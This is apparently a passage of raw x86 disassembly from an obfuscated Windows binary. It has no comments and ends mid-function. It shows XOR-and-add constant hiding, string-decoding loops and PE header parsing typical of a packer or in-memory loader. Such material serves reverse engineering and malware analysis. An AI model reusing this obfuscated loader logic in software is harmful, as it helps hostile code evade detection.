  428737:	mov    ebx,DWORD PTR [ebp-0x18]
  42873a:	inc    ebx
  42873b:	mov    DWORD PTR [ebp-0x18],ebx
  42873e:	cmp    ebx,DWORD PTR [ebp-0x8]
  428741:	jb     0x4286d7
  428743:	pop    esi
  428744:	pop    ebx
  428745:	pop    edi
  428746:	leave  
  428747:	ret    0x4
  42874a:	push   ebp
  42874b:	mov    ebp,esp
  42874d:	mov    eax,DWORD PTR [ebp+0x8]
  428750:	push   esi
  428751:	push   DWORD PTR [eax+0x1e0]
  428757:	lea    esi,[eax+0x198]
  42875d:	mov    eax,DWORD PTR [ebp+0x8]
  428760:	call   0x4285f9
  428765:	mov    ecx,DWORD PTR [esi]
  428767:	mov    DWORD PTR [ecx],eax
  428769:	mov    eax,DWORD PTR [esi]
  42876b:	xor    ecx,ecx
  42876d:	cmp    DWORD PTR [eax],ecx
  42876f:	pop    esi
  428770:	setne  cl
  428773:	mov    eax,ecx
  428775:	pop    ebp
  428776:	ret    0x4
  428779:	mov    ecx,DWORD PTR [edi+0x188]
  42877f:	push   ebx
  428780:	jmp    0x428795
  428782:	xor    eax,0x8a9a
  428787:	add    eax,0x3b5c
  42878c:	mov    WORD PTR [ecx],ax
  42878f:	add    ecx,0x2
  428792:	add    edx,0x2
  428795:	movzx  eax,WORD PTR [edx]
  428798:	mov    ebx,0x4e3e
  42879d:	cmp    ax,bx
  4287a0:	jne    0x428782
  4287a2:	xor    eax,eax
  4287a4:	mov    WORD PTR [ecx],ax
  4287a7:	mov    eax,DWORD PTR [edi+0x188]
  4287ad:	pop    ebx
  4287ae:	ret    
  4287af:	push   edi
  4287b0:	mov    edi,eax
  4287b2:	mov    eax,DWORD PTR [esi+0x188]
  4287b8:	shl    edi,0x6
  4287bb:	add    eax,edi
  4287bd:	jmp    0x4287c9
  4287bf:	xor    cl,0x7e
  4287c2:	add    cl,0x3
  4287c5:	mov    BYTE PTR [eax],cl
  4287c7:	inc    eax
  4287c8:	inc    edx
  4287c9:	mov    cl,BYTE PTR [edx]
  4287cb:	cmp    cl,0x83
  4287ce:	jne    0x4287bf
  4287d0:	mov    BYTE PTR [eax],0x0
  4287d3:	mov    eax,DWORD PTR [esi+0x188]
  4287d9:	add    eax,edi
  4287db:	pop    edi
  4287dc:	ret    
  4287dd:	push   ebp
  4287de:	mov    ebp,esp
  4287e0:	sub    esp,0x14
  4287e3:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  4287ea:	mov    DWORD PTR [ebp-0x4],0xf89c85a2
  4287f1:	mov    eax,DWORD PTR [ebx]
  4287f3:	mov    DWORD PTR [ebp-0x8],eax
  4287f6:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4287fd:	push   esi
  4287fe:	push   edi
  4287ff:	mov    DWORD PTR [ebp-0x14],0xead71885
  428806:	mov    edi,DWORD PTR [ebp-0x4]
  428809:	mov    ecx,DWORD PTR [ebp-0x10]
  42880c:	mov    eax,0x75108ae
  428811:	xor    edi,eax
  428813:	mov    edx,0x3272f5
  428818:	xor    ecx,eax
  42881a:	add    edi,edx
  42881c:	add    ecx,edx
  42881e:	imul   edi,ecx
  428821:	jmp    0x428869
  428823:	mov    ecx,DWORD PTR [ebp-0x8]
  428826:	mov    esi,DWORD PTR [ebp-0x4]
  428829:	xor    ecx,eax
  42882b:	xor    esi,eax
  42882d:	add    ecx,edx
  42882f:	add    esi,edx
  428831:	test   esi,ecx
  428833:	mov    esi,DWORD PTR [ebp-0x8]
  428836:	mov    ecx,DWORD PTR [ebp-0x4]
  428839:	je     0x428850
  42883b:	xor    ecx,eax
  42883d:	xor    esi,eax
  42883f:	add    ecx,edx
  428841:	add    esi,edx
  428843:	shr    esi,cl
  428845:	mov    ecx,DWORD PTR [ebp-0x14]
  428848:	xor    ecx,eax
  42884a:	add    ecx,edx
  42884c:	xor    esi,ecx
  42884e:	jmp    0x42885a
  428850:	xor    esi,eax
  428852:	xor    ecx,eax
  428854:	add    esi,edx
  428856:	add    ecx,edx
  428858:	shr    esi,cl
  42885a:	mov    DWORD PTR [ebp-0x8],esi
  42885d:	mov    ecx,DWORD PTR [ebp-0x4]
  428860:	xor    ecx,eax
  428862:	lea    edi,[edi+ecx*1+0x3272f5]
  428869:	mov    ecx,DWORD PTR [ebp-0xc]
  42886c:	mov    esi,DWORD PTR [ebp-0x4]
  42886f:	xor    esi,eax
  428871:	xor    ecx,eax
  428873:	sub    ecx,esi
  428875:	cmp    edi,ecx
  428877:	jbe    0x428823
  428879:	mov    eax,DWORD PTR [ebp-0x8]
  42887c:	pop    edi
  42887d:	mov    DWORD PTR [ebx],eax
  42887f:	mov    eax,DWORD PTR [ebp-0x8]
  428882:	pop    esi
  428883:	leave  
  428884:	ret    
  428885:	push   ebp
  428886:	mov    ebp,esp
  428888:	sub    esp,0x38
  42888b:	push   ebx
  42888c:	mov    ebx,0xf89c85a5
  428891:	mov    DWORD PTR [ebp-0x4],ebx
  428894:	lea    ecx,[ebx-0x3]
  428897:	mov    DWORD PTR [ebp-0x24],ecx
  42889a:	mov    eax,DWORD PTR [ebp-0x4]
  42889d:	mov    edx,DWORD PTR [ebp+0x8]
  4288a0:	push   esi
  4288a1:	mov    esi,0x75108ae
  4288a6:	xor    eax,esi
  4288a8:	push   edi
  4288a9:	mov    edi,0x3272f5
  4288ae:	add    eax,edi
  4288b0:	cmp    edx,eax
  4288b2:	mov    eax,DWORD PTR [ebp-0x4]
  4288b5:	je     0x428a1a
  4288bb:	mov    edx,DWORD PTR [ebp+0xc]
  4288be:	xor    eax,esi
  4288c0:	add    eax,edi
  4288c2:	cmp    edx,eax
  4288c4:	je     0x428a17
  4288ca:	mov    eax,DWORD PTR [ebp+0x10]
  4288cd:	mov    edx,DWORD PTR [ebp+0xc]
  4288d0:	mov    DWORD PTR [ebp-0x14],eax
  4288d3:	mov    eax,DWORD PTR [ebp+0x8]
  4288d6:	mov    DWORD PTR [ebp-0x18],0xf89c853d
  4288dd:	mov    DWORD PTR [ebp-0xc],eax
  4288e0:	lea    eax,[ebx-0x2]
  4288e3:	mov    DWORD PTR [ebp-0x1c],eax
  4288e6:	mov    DWORD PTR [ebp-0x10],ebx
  4288e9:	mov    DWORD PTR [ebp+0xc],ecx
  4288ec:	mov    DWORD PTR [ebp+0x10],eax
  4288ef:	mov    eax,DWORD PTR [ebp+0xc]
  4288f2:	xor    eax,esi
  4288f4:	mov    DWORD PTR [ebp-0x20],edx
  4288f7:	sub    edx,eax
  4288f9:	sub    edx,edi
  4288fb:	mov    DWORD PTR [ebp+0x8],edx
  4288fe:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  428905:	jmp    0x428a07
  42890a:	mov    eax,DWORD PTR [ebp+0xc]
  42890d:	mov    ecx,DWORD PTR [ebp+0xc]
  428910:	xor    eax,esi
  428912:	xor    ecx,esi
  428914:	lea    ecx,[eax+ecx*1+0x64e5ea]
  42891b:	mov    eax,DWORD PTR [ebp+0x8]
  42891e:	xor    edx,edx
  428920:	div    ecx
  428922:	mov    eax,DWORD PTR [ebp+0x10]
  428925:	mov    ecx,DWORD PTR [ebp+0xc]
  428928:	xor    eax,esi
  42892a:	xor    ecx,esi
  42892c:	sub    eax,ecx
  42892e:	cmp    edx,eax
  428930:	jne    0x4289c6
  428936:	mov    eax,DWORD PTR [ebp+0x8]
  428939:	mov    ecx,DWORD PTR [ebp-0xc]
  42893c:	mov    dl,BYTE PTR [eax+ecx*1]
  42893f:	mov    eax,DWORD PTR [ebp-0x10]
  428942:	mov    ecx,DWORD PTR [ebp-0x8]
  428945:	xor    eax,esi
  428947:	xor    ecx,esi
  428949:	add    eax,edi
  42894b:	add    ecx,edi
  42894d:	cmp    eax,ecx
  42894f:	jae    0x428997
  428951:	lea    ecx,[eax-0x3272f5]
  428957:	mov    DWORD PTR [ebp-0x4],ecx
  42895a:	mov    ebx,DWORD PTR [ebp-0x4]
  42895d:	xor    ebx,esi
  42895f:	add    ebx,0x7f55d8e3
  428965:	lea    ecx,[ebp+eax*4-0x38]
  428969:	mov    DWORD PTR [ecx],ebx
  42896b:	mov    ebx,DWORD PTR [ecx]
  42896d:	cmp    ebx,0x244ecb80
  428973:	jbe    0x42897d
  428975:	add    DWORD PTR [ecx],0x405fcc1
  42897b:	jmp    0x428983
  42897d:	add    DWORD PTR [ecx],0xfdaf433f
  428983:	mov    ecx,DWORD PTR [ebp-0x8]
  428986:	xor    ecx,esi
  428988:	inc    eax
  428989:	inc    DWORD PTR [ebp-0x4]
  42898c:	add    ecx,edi
  42898e:	cmp    eax,ecx
  428990:	jb     0x42895a
  428992:	mov    ebx,0xf89c85a5
  428997:	cmp    DWORD PTR [ebp-0x14],0x0
  42899b:	jne    0x4289a5
  42899d:	xor    dl,0x7e
  4289a0:	add    dl,0x3
  4289a3:	jmp    0x4289bb
  4289a5:	mov    eax,DWORD PTR [ebp-0x18]
  4289a8:	xor    al,0xae
  4289aa:	mov    cl,0xb
  4289ac:	sub    cl,al
  4289ae:	add    dl,cl
  4289b0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4289b3:	xor    cl,0xae
  4289b6:	sub    cl,0xb
  4289b9:	ror    dl,cl
  4289bb:	xor    eax,eax
  4289bd:	mov    eax,DWORD PTR [ebp+0x8]
  4289c0:	mov    ecx,DWORD PTR [ebp-0xc]
  4289c3:	mov    BYTE PTR [eax+ecx*1],dl
  4289c6:	mov    eax,DWORD PTR [ebp+0x8]
  4289c9:	mov    ecx,DWORD PTR [ebp-0x10]
  4289cc:	sub    eax,edi
  4289ce:	xor    eax,esi
  4289d0:	cmp    eax,ecx
  4289d2:	jne    0x4289f5
  4289d4:	mov    eax,DWORD PTR [ebp+0x10]
  4289d7:	mov    ecx,DWORD PTR [ebp+0xc]
  4289da:	xor    eax,esi
  4289dc:	xor    ecx,esi
  4289de:	sub    eax,ecx
  4289e0:	mov    ecx,DWORD PTR [ebp-0x20]
  4289e3:	sub    eax,edi
  4289e5:	xor    eax,esi
  4289e7:	mov    DWORD PTR [ebp+0x10],eax
  4289ea:	mov    eax,DWORD PTR [ebp+0xc]
  4289ed:	xor    eax,esi
  4289ef:	sub    ecx,eax
  4289f1:	sub    ecx,edi
  4289f3:	jmp    0x428a04
  4289f5:	mov    eax,DWORD PTR [ebp+0xc]
  4289f8:	xor    eax,esi
  4289fa:	mov    ecx,0xffcd8d0b
  4289ff:	sub    ecx,eax
  428a01:	add    ecx,DWORD PTR [ebp+0x8]
  428a04:	mov    DWORD PTR [ebp+0x8],ecx
  428a07:	mov    eax,DWORD PTR [ebp+0x10]
  428a0a:	cmp    eax,ebx
  428a0c:	jne    0x42890a
  428a12:	mov    eax,DWORD PTR [ebp-0x24]
  428a15:	jmp    0x428a1a
  428a17:	mov    eax,DWORD PTR [ebp-0x4]
  428a1a:	xor    eax,esi
  428a1c:	add    eax,edi
  428a1e:	pop    edi
  428a1f:	pop    esi
  428a20:	pop    ebx
  428a21:	leave  
  428a22:	ret    0xc
  428a25:	push   ebp
  428a26:	mov    ebp,esp
  428a28:	sub    esp,0x420
  428a2e:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  428a35:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  428a3c:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  428a43:	push   ebx
  428a44:	mov    DWORD PTR [ebp-0x1c],0xf89c85a4
  428a4b:	mov    eax,DWORD PTR [ebp-0x14]
  428a4e:	push   esi
  428a4f:	mov    esi,0x75108ae
  428a54:	push   edi
  428a55:	xor    eax,esi
  428a57:	mov    edi,0x3272f5
  428a5c:	add    eax,edi
  428a5e:	mov    DWORD PTR [ebp-0x8],eax
  428a61:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  428a68:	mov    DWORD PTR [ebp-0x4],0xead71885
  428a6f:	mov    DWORD PTR [ebp-0x10],0x8
  428a76:	mov    ecx,ecx
  428a78:	mov    eax,DWORD PTR [ebp-0xc]
  428a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  428a7e:	xor    eax,esi
  428a80:	xor    ecx,esi
  428a82:	add    eax,edi
  428a84:	add    ecx,edi
  428a86:	imul   eax,ecx
  428a89:	jmp    0x428abc
  428a8b:	mov    eax,DWORD PTR [ebp-0x4]
  428a8e:	sub    eax,edi
  428a90:	xor    eax,esi
  428a92:	mov    DWORD PTR [ebp-0x8],eax
  428a95:	lea    ebx,[ebp-0x8]
  428a98:	call   0x4287dd
  428a9d:	mov    DWORD PTR [ebp-0x8],eax
  428aa0:	mov    eax,DWORD PTR [ebp-0x8]
  428aa3:	mov    ecx,DWORD PTR [ebp-0x4]
  428aa6:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  428aad:	mov    eax,DWORD PTR [ebp-0xc]
  428ab0:	mov    ecx,DWORD PTR [ebp-0x4]
  428ab3:	xor    eax,esi
  428ab5:	lea    eax,[eax+ecx*1+0x3272f5]
  428abc:	mov    DWORD PTR [ebp-0x4],eax
  428abf:	mov    eax,DWORD PTR [ebp-0x18]
  428ac2:	mov    ecx,DWORD PTR [ebp-0xc]
  428ac5:	xor    ecx,esi
  428ac7:	xor    eax,esi
  428ac9:	sub    eax,ecx
  428acb:	mov    ecx,DWORD PTR [ebp-0x4]
  428ace:	cmp    ecx,eax
  428ad0:	jbe    0x428a8b
  428ad2:	mov    eax,DWORD PTR [ebp-0x1c]
  428ad5:	xor    eax,esi
  428ad7:	add    eax,edi
  428ad9:	mov    DWORD PTR [ebp-0x8],eax
  428adc:	mov    DWORD PTR [ebp-0x18],0xf89c86a4
  428ae3:	mov    ebx,ebx
  428ae5:	jmp    0x428b48
  428ae7:	mov    ecx,DWORD PTR [ebp-0x20]
  428aea:	mov    eax,DWORD PTR [ebp-0x8]
  428aed:	xor    ecx,esi
  428aef:	add    ecx,edi
  428af1:	shr    eax,cl
  428af3:	mov    DWORD PTR [ebp-0x4],eax
  428af6:	mov    eax,DWORD PTR [ebp+0x8]
  428af9:	mov    cl,BYTE PTR [eax]
  428afb:	mov    BYTE PTR [ebp+0xb],cl
  428afe:	mov    cl,BYTE PTR [ebp+0xb]
  428b01:	mov    edx,DWORD PTR [ebp-0x8]
  428b04:	movzx  ecx,cl
  428b07:	xor    ecx,edx
  428b09:	mov    DWORD PTR [ebp+0x8],ecx
  428b0c:	mov    ecx,DWORD PTR [ebp-0x18]
  428b0f:	mov    edx,DWORD PTR [ebp+0x8]
  428b12:	xor    ecx,esi
  428b14:	add    ecx,edi
  428b16:	and    ecx,edx
  428b18:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  428b1f:	mov    edx,DWORD PTR [ebp-0x4]
  428b22:	xor    ecx,edx
  428b24:	mov    DWORD PTR [ebp-0x8],ecx
  428b27:	mov    ecx,DWORD PTR [ebp-0xc]
  428b2a:	xor    ecx,esi
  428b2c:	lea    eax,[eax+ecx*1+0x3272f5]
  428b33:	mov    DWORD PTR [ebp+0x8],eax
  428b36:	mov    eax,DWORD PTR [ebp-0xc]
  428b39:	xor    eax,esi
  428b3b:	mov    ecx,0xffcd8d0b
  428b40:	sub    ecx,eax
  428b42:	add    ecx,DWORD PTR [ebp-0x10]
  428b45:	mov    DWORD PTR [ebp-0x10],ecx
  428b48:	mov    eax,DWORD PTR [ebp-0x14]
  428b4b:	mov    ecx,DWORD PTR [ebp-0x10]
  428b4e:	xor    eax,esi
  428b50:	add    eax,edi
  428b52:	cmp    ecx,eax
  428b54:	jne    0x428ae7
  428b56:	mov    eax,DWORD PTR [ebp-0x1c]
  428b59:	mov    ecx,DWORD PTR [ebp-0x8]
  428b5c:	xor    eax,esi
  428b5e:	add    eax,edi
  428b60:	pop    edi
  428b61:	pop    esi
  428b62:	xor    eax,ecx
  428b64:	pop    ebx
  428b65:	leave  
  428b66:	ret    0x4
  428b69:	push   ebp
  428b6a:	mov    ebp,esp
  428b6c:	mov    eax,DWORD PTR [ebp+0x1c]
  428b6f:	mov    ecx,DWORD PTR [ebp+0x8]
  428b72:	mov    edx,DWORD PTR [ebp+0x10]
  428b75:	mov    eax,DWORD PTR [eax+0x190]
  428b7b:	mov    eax,DWORD PTR [eax]
  428b7d:	sub    esp,0x64
  428b80:	push   ebx
  428b81:	push   esi
  428b82:	push   edi
  428b83:	mov    edi,0x75108ae
  428b88:	xor    ecx,edi
  428b8a:	mov    ebx,0x3272f5
  428b8f:	add    ecx,ebx
  428b91:	cmp    ecx,edx
  428b93:	jne    0x428ba4
  428b95:	or     DWORD PTR ds:0x3750c3f,0x4263eb2c
  428b9f:	jmp    0x4290a0
  428ba4:	mov    ecx,DWORD PTR [ebp+0x8]
  428ba7:	mov    esi,DWORD PTR [ebp+0x14]
  428baa:	mov    edx,DWORD PTR [esi]
  428bac:	xor    ecx,edi
  428bae:	add    ecx,ebx
  428bb0:	cmp    edx,ecx
  428bb2:	je     0x42905b
  428bb8:	mov    ecx,DWORD PTR [ebp+0x1c]
  428bbb:	mov    DWORD PTR [ebp-0x1c],eax
  428bbe:	mov    DWORD PTR [ebp+0x1c],ecx
  428bc1:	mov    ecx,DWORD PTR [ebp+0x18]
  428bc4:	mov    eax,DWORD PTR [esi]
  428bc6:	mov    DWORD PTR [ebp-0x20],eax
  428bc9:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  428bd0:	mov    edx,0xf89c85a2
  428bd5:	mov    DWORD PTR [ebp-0x8],edx
  428bd8:	mov    eax,DWORD PTR [ebp+0x1c]
  428bdb:	mov    DWORD PTR [ebp+0x1c],eax
  428bde:	mov    eax,DWORD PTR [ebp+0x1c]
  428be1:	mov    eax,DWORD PTR [eax+0x190]
  428be7:	mov    eax,DWORD PTR [eax]
  428be9:	mov    DWORD PTR [ebp-0x24],ecx
  428bec:	mov    ecx,DWORD PTR [ebp+0x1c]
  428bef:	mov    ecx,DWORD PTR [ecx+0x190]
  428bf5:	mov    ecx,DWORD PTR [ecx]
  428bf7:	add    ecx,DWORD PTR [eax+0x3c]
  428bfa:	mov    DWORD PTR [ebp+0x10],ecx
  428bfd:	mov    eax,DWORD PTR [ebp+0x8]
  428c00:	xor    eax,edi
  428c02:	add    eax,ebx
  428c04:	mov    DWORD PTR [ebp-0x4],eax
  428c07:	mov    eax,DWORD PTR [ebp+0x8]
  428c0a:	xor    eax,edi
  428c0c:	add    eax,ebx
  428c0e:	mov    DWORD PTR [ebp+0x18],eax
  428c11:	mov    eax,DWORD PTR [ebp+0x10]
  428c14:	mov    eax,DWORD PTR [eax+0x50]
  428c17:	sub    eax,0xc
  428c1a:	mov    DWORD PTR [ebp-0x28],eax
  428c1d:	mov    eax,DWORD PTR [ebp+0x10]
  428c20:	mov    eax,DWORD PTR [eax+0x38]
  428c23:	mov    ecx,DWORD PTR [ebp+0x10]
  428c26:	dec    eax
  428c27:	test   DWORD PTR [ecx+0x54],eax
  428c2a:	mov    eax,DWORD PTR [ebp+0x10]
  428c2d:	je     0x428c47
  428c2f:	mov    eax,DWORD PTR [eax+0x38]
  428c32:	mov    ecx,DWORD PTR [ebp+0x10]
  428c35:	mov    ecx,DWORD PTR [ecx+0x54]
  428c38:	dec    eax
  428c39:	not    eax
  428c3b:	and    ecx,eax
  428c3d:	mov    eax,DWORD PTR [ebp+0x10]
  428c40:	mov    eax,DWORD PTR [eax+0x38]
  428c43:	add    eax,ecx
  428c45:	jmp    0x428c4a
  428c47:	mov    eax,DWORD PTR [eax+0x54]
  428c4a:	mov    DWORD PTR [ebp+0x1c],eax
  428c4d:	mov    eax,DWORD PTR [ebp+0x8]
  428c50:	xor    eax,edi
  428c52:	add    eax,ebx
  428c54:	mov    DWORD PTR [ebp+0x18],eax
  428c57:	mov    eax,DWORD PTR [ebp+0x8]
  428c5a:	xor    eax,edi
  428c5c:	add    eax,ebx
  428c5e:	mov    DWORD PTR [ebp+0x18],eax
  428c61:	mov    eax,DWORD PTR [ebp+0x8]
  428c64:	mov    ecx,DWORD PTR [ebp-0x24]
  428c67:	xor    eax,edi
  428c69:	add    eax,ebx
  428c6b:	mov    DWORD PTR [ecx],eax
  428c6d:	mov    DWORD PTR [ebp+0x18],edx
  428c70:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  428c77:	mov    DWORD PTR [ebp+0x18],0xf89c85a0
  428c7e:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  428c85:	mov    eax,DWORD PTR [ebp-0x8]
  428c88:	mov    ecx,DWORD PTR [ebp+0x1c]
  428c8b:	xor    eax,edi
  428c8d:	add    eax,ebx
  428c8f:	imul   eax,ecx
  428c92:	mov    ecx,DWORD PTR [ebp+0x8]
  428c95:	mov    edx,DWORD PTR [ebp-0x28]
  428c98:	xor    ecx,edi
  428c9a:	lea    ecx,[ecx+edx*1+0x3272f5]
  428ca1:	cmp    eax,ecx
  428ca3:	jae    0x429054
  428ca9:	mov    eax,DWORD PTR [ebp+0x8]
  428cac:	xor    eax,edi
  428cae:	add    eax,ebx
  428cb0:	mov    DWORD PTR [ebp+0x18],eax
  428cb3:	mov    eax,DWORD PTR [ebp+0x1c]
  428cb6:	add    eax,DWORD PTR [ebp-0x1c]
  428cb9:	mov    DWORD PTR [ebp-0x4],eax
  428cbc:	push   DWORD PTR [ebp-0x4]
  428cbf:	mov    esi,DWORD PTR [ebp-0x1c]
  428cc2:	mov    ecx,DWORD PTR [ebp+0x10]
  428cc5:	call   0x427e15
  428cca:	mov    DWORD PTR [ebp+0xc],eax
  428ccd:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  428cd4:	mov    eax,DWORD PTR [ebp-0x18]
  428cd7:	xor    eax,edi
  428cd9:	lea    ecx,[ebp-0x40]
  428cdc:	add    eax,ebx
  428cde:	push   ecx
  428cdf:	call   0x4283a9
  428ce4:	mov    eax,DWORD PTR [ebp+0xc]
  428ce7:	test   eax,eax
  428ce9:	je     0x428d39
  428ceb:	mov    eax,DWORD PTR [ebp-0x18]
  428cee:	xor    eax,edi
  428cf0:	add    eax,ebx
  428cf2:	push   eax
  428cf3:	push   DWORD PTR [ebp+0xc]
  428cf6:	lea    eax,[ebp-0x40]
  428cf9:	push   eax
  428cfa:	call   0x42829f
  428cff:	mov    eax,DWORD PTR [ebp-0x4]
  428d02:	mov    DWORD PTR [ebp-0x18],eax
  428d05:	mov    eax,DWORD PTR [ebp-0x18]
  428d08:	mov    ecx,DWORD PTR [ebp-0x1c]
  428d0b:	sub    eax,ecx
  428d0d:	mov    DWORD PTR [ebp-0x18],eax
  428d10:	mov    eax,DWORD PTR [ebp+0xc]
  428d13:	mov    ecx,DWORD PTR [ebp+0xc]
  428d16:	mov    eax,DWORD PTR [eax+0x10]
  428d19:	add    eax,DWORD PTR [ecx+0xc]
  428d1c:	mov    ecx,DWORD PTR [ebp-0x18]
  428d1f:	cmp    ecx,eax
  428d21:	jb     0x428d39
  428d23:	mov    eax,DWORD PTR [ebp+0xc]
  428d26:	mov    eax,DWORD PTR [eax+0xc]
  428d29:	mov    ecx,DWORD PTR [ebp+0xc]
  428d2c:	add    eax,DWORD PTR [ecx+0x8]
  428d2f:	mov    ecx,DWORD PTR [ebp-0x18]
  428d32:	sub    eax,ecx
  428d34:	jmp    0x429027
  428d39:	push   0xc
  428d3b:	push   DWORD PTR [ebp-0x4]
  428d3e:	lea    eax,[ebp-0x4c]
  428d41:	push   eax
  428d42:	call   0x42829f
  428d47:	mov    eax,0xf89c85a5
  428d4c:	mov    DWORD PTR [ebp-0x2c],eax
  428d4f:	mov    DWORD PTR [ebp-0x30],0xf89c85a2
  428d56:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  428d5d:	mov    DWORD PTR [ebp-0x38],0xf89c85a0
  428d64:	lea    ecx,[ebp-0x2c]
  428d67:	mov    DWORD PTR [ebp-0xc],ecx
  428d6a:	lea    ecx,[ebp-0x30]
  428d6d:	mov    DWORD PTR [ebp-0x10],ecx
  428d70:	lea    ecx,[ebp-0x34]
  428d73:	mov    DWORD PTR [ebp+0xc],ecx
  428d76:	lea    ecx,[ebp-0x38]
  428d79:	mov    DWORD PTR [ebp-0x14],ecx
  428d7c:	mov    ecx,DWORD PTR [ebp+0x8]
  428d7f:	xor    ecx,edi
  428d81:	add    ecx,ebx
  428d83:	mov    DWORD PTR [ebp-0x18],ecx
  428d86:	jmp    0x428f82
  428d8b:	cmp    eax,0xf89c85a3
  428d90:	je     0x428f94
  428d96:	mov    ecx,DWORD PTR [ebp-0x8]
  428d99:	xor    ecx,edi
  428d9b:	mov    esi,eax
  428d9d:	add    ecx,ebx
  428d9f:	mov    DWORD PTR [ebp+0x18],ecx
  428da2:	mov    eax,DWORD PTR [ebp-0x18]
  428da5:	xor    esi,edi
  428da7:	lea    eax,[eax+esi*1+0x3272f5]
  428dae:	mov    DWORD PTR [ebp-0x18],eax
  428db1:	mov    eax,DWORD PTR [ebp-0x8]
  428db4:	mov    ecx,DWORD PTR [ebp-0x18]
  428db7:	xor    eax,edi
  428db9:	add    eax,ebx
  428dbb:	cmp    ecx,eax
  428dbd:	jne    0x428dd2
  428dbf:	mov    eax,DWORD PTR [ebp+0x8]
  428dc2:	xor    eax,edi
  428dc4:	add    eax,ebx
  428dc6:	push   eax
  428dc7:	push   0xc
  428dc9:	lea    eax,[ebp-0x4c]
  428dcc:	push   eax
  428dcd:	call   0x428885
  428dd2:	mov    eax,DWORD PTR [ebp-0xc]
  428dd5:	mov    eax,DWORD PTR [eax]
  428dd7:	xor    eax,edi
  428dd9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428de0:	mov    ecx,DWORD PTR [ebp+0x8]
  428de3:	xor    ecx,edi
  428de5:	movzx  eax,al
  428de8:	add    ecx,ebx
  428dea:	cmp    eax,ecx
  428dec:	je     0x428f6a
  428df2:	mov    eax,DWORD PTR [ebp-0x10]
  428df5:	mov    eax,DWORD PTR [eax]
  428df7:	xor    eax,edi
  428df9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e00:	mov    ecx,DWORD PTR [ebp+0x8]
  428e03:	xor    ecx,edi
  428e05:	movzx  eax,al
  428e08:	add    ecx,ebx
  428e0a:	cmp    eax,ecx
  428e0c:	je     0x428f6a
  428e12:	mov    eax,DWORD PTR [ebp+0xc]
  428e15:	mov    eax,DWORD PTR [eax]
  428e17:	xor    eax,edi
  428e19:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e20:	mov    ecx,DWORD PTR [ebp+0x8]
  428e23:	xor    ecx,edi
  428e25:	movzx  eax,al
  428e28:	add    ecx,ebx
  428e2a:	cmp    eax,ecx
  428e2c:	je     0x428f6a
  428e32:	mov    eax,DWORD PTR [ebp-0x14]
  428e35:	mov    eax,DWORD PTR [eax]
  428e37:	xor    eax,edi
  428e39:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e40:	mov    ecx,DWORD PTR [ebp+0x8]
  428e43:	xor    ecx,edi
  428e45:	movzx  eax,al
  428e48:	add    ecx,ebx
  428e4a:	cmp    eax,ecx
  428e4c:	je     0x428f6a
  428e52:	mov    eax,DWORD PTR [ebp-0x10]
  428e55:	mov    eax,DWORD PTR [eax]
  428e57:	xor    eax,edi
  428e59:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e60:	mov    ecx,DWORD PTR [ebp-0xc]
  428e63:	mov    ecx,DWORD PTR [ecx]
  428e65:	xor    ecx,edi
  428e67:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428e6e:	xor    al,cl
  428e70:	mov    ecx,DWORD PTR [ebp+0xc]
  428e73:	mov    ecx,DWORD PTR [ecx]
  428e75:	xor    ecx,edi
  428e77:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428e7e:	or     al,cl
  428e80:	mov    ecx,DWORD PTR [ebp-0xc]
  428e83:	mov    ecx,DWORD PTR [ecx]
  428e85:	xor    ecx,edi
  428e87:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428e8e:	cmp    cl,al
  428e90:	jne    0x428f6a
  428e96:	mov    eax,DWORD PTR [ebp+0xc]
  428e99:	mov    eax,DWORD PTR [eax]
  428e9b:	xor    eax,edi
  428e9d:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428ea4:	mov    ecx,DWORD PTR [ebp-0x10]
  428ea7:	mov    ecx,DWORD PTR [ecx]
  428ea9:	xor    ecx,edi
  428eab:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428eb2:	xor    al,cl
  428eb4:	mov    ecx,DWORD PTR [ebp-0x14]
  428eb7:	mov    ecx,DWORD PTR [ecx]
  428eb9:	xor    ecx,edi
  428ebb:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428ec2:	or     al,cl
  428ec4:	mov    ecx,DWORD PTR [ebp-0x10]
  428ec7:	mov    ecx,DWORD PTR [ecx]
  428ec9:	xor    ecx,edi
  428ecb:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428ed2:	cmp    cl,al
  428ed4:	jne    0x428f6a
  428eda:	mov    eax,DWORD PTR [ebp-0x14]
  428edd:	mov    eax,DWORD PTR [eax]
  428edf:	xor    eax,edi
  428ee1:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428ee8:	mov    ecx,DWORD PTR [ebp+0xc]
  428eeb:	mov    ecx,DWORD PTR [ecx]
  428eed:	xor    ecx,edi
  428eef:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428ef6:	xor    al,cl
  428ef8:	mov    ecx,DWORD PTR [ebp-0xc]
  428efb:	mov    ecx,DWORD PTR [ecx]
  428efd:	xor    ecx,edi
  428eff:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f06:	or     al,cl
  428f08:	mov    ecx,DWORD PTR [ebp+0xc]
